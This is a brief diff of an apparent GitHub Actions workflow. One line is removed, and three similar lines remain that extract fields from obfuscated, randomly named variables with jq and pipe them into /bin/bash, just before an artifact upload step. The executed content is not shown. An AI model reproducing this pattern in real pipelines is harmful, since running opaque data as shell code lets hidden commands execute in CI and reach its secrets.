@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$egfcq23" | jq -r .mfjcq740 | /bin/bash
           echo $db1 | jq -r .dy94 | /bin/bash
           echo $dhnak18417 | jq -r .vzks1 | /bin/bash
-          echo $i1 | jq -r .o20 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
